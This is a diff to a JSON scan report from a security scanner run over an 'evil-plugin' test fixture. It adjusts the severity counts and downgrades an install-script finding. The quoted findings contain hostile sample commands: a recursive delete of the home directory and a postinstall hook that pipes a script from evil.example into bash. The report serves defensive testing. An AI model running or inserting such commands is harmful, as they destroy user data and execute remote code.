@@ -3,7 +3,7 @@
   "evilFixtureReport": {
     "tool": "dsh-sentinel",
     "version": "0.1.0",
-    "scannedAt": "2026-08-17T14:40:03.116Z",
+    "scannedAt": "2026-08-17T15:37:51.175Z",
     "target": {
       "kind": "path",
       "path": "C:\\Users\\Administrator\\Desktop\\code\\dsh-sentinel\\test\\fixtures\\evil-plugin",
@@ -17,8 +17,8 @@
       "totalFindings": 20,
       "bySeverity": {
         "critical": 5,
-        "high": 9,
-        "medium": 4,
+        "high": 8,
+        "medium": 5,
         "low": 2,
         "info": 0
       },
@@ -37,7 +37,7 @@
         "source": 20,
         "test": 0
       },
-      "scanMs": 6
+      "scanMs": 4
     },
     "manifest": {
       "ok": true,
@@ -111,18 +111,6 @@
         "line": 27,
         "snippet": "cp.execSync('rm -rf $HOME')",
         "recommendation": "拒绝安装。任何指向用户主目录或系统目录的递归删除都是恶意特征。",
-        "package": "",
-        "testFile": false
-      },
-      {
-        "id": "SEN-INST-001",
-        "severity": "high",
-        "category": "install",
-        "message": "存在安装生命周期脚本(preinstall / install / postinstall / prepare)",
-        "file": "package.json",
-        "line": 12,
-        "snippet": "\"postinstall\": \"curl -s http://evil.example/install.sh | bash\"",
-        "recommendation": "逐行审阅脚本内容;不确定就拒绝安装。可先以 --ignore-scripts 安装再手动审查。",
         "package": "",
         "testFile": false
       },
@@ -219,6 +207,18 @@
         "line": 31,
         "snippet": "// aXQgd2l0aCBhIGhpZ2ggc2V2ZXJpdHkgZmluZGluZyBpbiB0aGUgcmVwb3J0IGFuZCB0aGlzIHNlY29uZCBsaW5lIGlzIGp1c3QgYXMgbG9uZyBhcyB0aGUgZmlyc3Qgb25lIHNvIHRoYXQgdGhlIGV4dGVuZGVkIHBheWxvYWQgZGV0ZWN0aW9uIHJ1bGUgZmluZHMgYXQgbGVhc3Qgb25lIG1hdGNoIGluIHRoZSBm…",
         "recommendation": "先解码再判断:若解码结果是可读代码或数据且无文档说明,按恶意处理。",
+        "package": "",
+        "testFile": false
+      },
+      {
+        "id": "SEN-INST-001",
+        "severity": "medium",
+        "category": "install",
+        "message": "存在安装生命周期脚本(preinstall / install / postinstall / prepare)",
+        "file": "package.json",
+        "line": 12,
+        "snippet": "\"postinstall\": \"curl -s http://evil.example/install.sh | bash\"",
+        "recommendation": "逐行审阅脚本内容。纯构建类(prepare: npm run build / tsc / tsdown)可接受;含网络下载、base64、chmod 等请按 SEN-INST-002 处理。",
         "package": "",
         "testFile": false
       },
